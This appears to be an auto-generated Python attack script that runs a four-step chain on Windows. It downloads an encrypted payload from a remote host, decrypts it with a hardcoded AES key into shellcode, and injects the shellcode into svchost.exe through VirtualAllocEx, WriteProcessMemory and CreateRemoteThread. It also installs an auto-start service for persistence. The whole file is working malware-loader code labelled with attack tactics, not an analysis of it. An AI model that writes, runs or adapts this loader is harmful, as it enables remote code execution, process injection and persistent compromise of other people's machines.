#!/usr/bin/env python3
import sys, json, time, requests, ctypes, psutil, subprocess
from typing import Dict, Any
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from ctypes import wintypes

PROCESS_ALL_ACCESS = 0x1F0FFF

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    url = "https://192.168.1.100/payload"
    result = {'data': None, 'url': url}
    
    try:
        response = requests.get(url, stream=True, timeout=30)
        response.raise_for_status()
        
        file_data = bytearray()
        for chunk in response.iter_content(8192):
            file_data.extend(chunk)
        
        if len(file_data) > 0:
            result['data'] = file_data.hex()
        else:
            raise ValueError("Downloaded file is empty")
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        key = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10'
        iv = b'\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20'
        
        ciphertext = bytes.fromhex(input_data.get('data', ''))
        
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
        
        result = {'shellcode': decrypted_data.hex()}
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        result = {'shellcode': None}
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def find_process_by_name(process_name: str) -> int:
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == process_name.lower():
            return proc.info['pid']
    return None

def inject_shellcode(pid: int, shellcode: bytes) -> bool:
    kernel32 = ctypes.windll.kernel32

    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        return False

    remote_addr = kernel32.VirtualAllocEx(h_process, None, len(shellcode), 0x3000, 0x40)
    if not remote_addr:
        kernel32.CloseHandle(h_process)
        return False

    written = ctypes.c_size_t(0)
    if not kernel32.WriteProcessMemory(h_process, remote_addr, shellcode, len(shellcode), ctypes.byref(written)):
        kernel32.CloseHandle(h_process)
        return False

    if not kernel32.CreateRemoteThread(h_process, None, 0, remote_addr, None, 0, None):
        kernel32.CloseHandle(h_process)
        return False

    kernel32.CloseHandle(h_process)
    return True

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        shellcode = bytes.fromhex(input_data.get('shellcode', ''))
        
        pid = find_process_by_name('svchost.exe')
        if pid is None:
            pid = psutil.Process().pid
            injection_success = False
        else:
            injection_success = inject_shellcode(pid, shellcode)

        result = {'success': injection_success}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    service_name = "MyPersistentService"
    exe_path = r"C:\Windows\System32\notepad.exe"
    result = {'service_name': service_name, 'success': False}

    try:
        create_command = ['sc', 'create', service_name, 'binPath=', exe_path, 'start=', 'auto']
        create_process = subprocess.run(create_command, capture_output=True, text=True, timeout=10)
        
        if create_process.returncode == 0:
            start_command = ['sc', 'start', service_name]
            start_process = subprocess.run(start_command, capture_output=True, text=True, timeout=10)
            
            if start_process.returncode == 0:
                result['success'] = True

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Download Encrypted Payload [exfiltration] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Download Encrypted Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Download Encrypted Payload): FAILED — {err}')
            failed.append('T1')
            r2 = task_T1(None)
            if r2.get('success'):
                outputs['T1'] = r2.get('data', {})
                failed.remove('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T4: Establish Persistence [persistence] ──
    try:
        r = task_T4(None)
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Establish Persistence): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Establish Persistence): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    # ── T2: Decrypt Payload [defense-evasion] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Decrypt Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Decrypt Payload): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Inject Shellcode [execution] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Inject Shellcode): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Inject Shellcode): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))